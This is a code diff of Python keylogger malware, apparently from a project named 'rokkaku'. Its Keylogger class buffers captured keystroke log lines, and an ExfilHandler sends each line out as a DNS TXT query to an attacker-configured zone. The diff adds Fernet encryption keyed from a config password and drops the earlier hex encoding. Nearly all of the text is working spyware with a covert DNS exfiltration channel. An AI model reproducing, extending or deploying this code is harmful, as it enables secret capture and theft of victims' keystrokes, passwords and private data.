@@ -9,16 +9,21 @@ try:
 except ImportError:
     from io import StringIO
 
-import binascii
+import base64
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.backends import default_backend
 import dns.exception
 import dns.resolver
+import logging
 import logging.handlers
 import sys
-import socket
+import time
 
 cfg = """
 [rokkaku]
 dns_zone
+password
 """
 
 
@@ -31,6 +36,14 @@ def cfg_factory(cfg):
     if not local_cfg.has_section('rokkaku'):
         sys.exit(1)
     return local_cfg
+
+
+def aes_factory(cfg):
+    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
+    password = cfg.get('rokkaku', 'password')
+    digest.update(bytes(password, 'utf8'))
+    key = base64.urlsafe_b64encode(digest.finalize())
+    return Fernet(key)
 
 
 mal_cfg = cfg_factory(cfg)
@@ -59,24 +72,25 @@ class ExfilHandler(logging.handlers.MemoryHandler):
         self.buffer.append(record)
         if not self.shouldFlush(record):
             return
-
         self.flush()
-
         dns_zone = mal_cfg.get('rokkaku', 'dns_zone')
         if not self.can_exfil:
             return
         exfil_data = self.target.stream.getvalue().splitlines()
         for exfil in exfil_data:
-            payload = binascii.hexlify(bytes(exfil, 'utf8'))
             try:
                 dns.resolver.query(
                     '{exfil}.{dns_zone}'.format(
-                        exfil=payload,
+                        exfil=exfil,
                         dns_zone=dns_zone),
                     rdtype=dns.rdatatype.TXT)
             except dns.exception.DNSException:
                 continue
         self.target.stream = StringIO()
+
+
+class UTCFormatter(logging.Formatter):
+    converter = time.gmtime
 
 
 class Keylogger(object):
@@ -89,8 +103,9 @@ class Keylogger(object):
         self.logger = logger or logging.getLogger(__name__)
         self.logger.setLevel(logging.INFO)
         stream_handler = logging.StreamHandler(StringIO())
-        formatter = logging.Formatter(
-            fmt=self.BASE_FORMAT, datefmt=self.DATE_FORMAT)
+        formatter = UTCFormatter(
+            fmt=self.BASE_FORMAT,
+            datefmt=self.DATE_FORMAT)
         stream_handler.setFormatter(formatter)
         self.exfil_handler = ExfilHandler(
             capacity=self.BUFFER_SIZE, target=stream_handler)
